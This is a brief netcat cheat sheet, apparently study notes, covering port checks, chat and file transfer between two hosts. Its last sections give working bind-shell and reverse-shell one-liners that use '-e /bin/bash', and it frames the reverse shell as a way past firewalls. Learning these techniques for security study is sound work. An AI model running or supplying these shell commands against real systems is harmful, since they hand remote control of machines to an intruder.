# Netcat

## Is Open Port

```bash
nc -v huakunshen.com 80
nc -nv 192.168.1.66 80		# -n for skipping DNS name resolution
```

## Chat
```bash
nc -nlvp 4444				# machine 1: listening on port 4444
nc -nv 192.168.1.63 4444	# machine 2: connect to machine 1
```


## File Transfer

```bash
nc -nlvp 4444 > incoming.exe		# listening for data and pipe to a file
nc -nv 192.168.1.63 4444 < wget.exe
```


## Bind Shell

```bash
nc -nlvp 4444 -e /bin/bash			# listening for connection, whoever connected get my shell
nc -nv 192.168.105.128 4444			# connect and use the given shell		
```


## Reverse Shell
> bypass firewall if firewall doesn't allow output flow
```bash
nc -nlvp 4444								# waiting for a reverse shell
nc -nv 192.168.1.63 4444 -e /bin/bash		# send my shell
```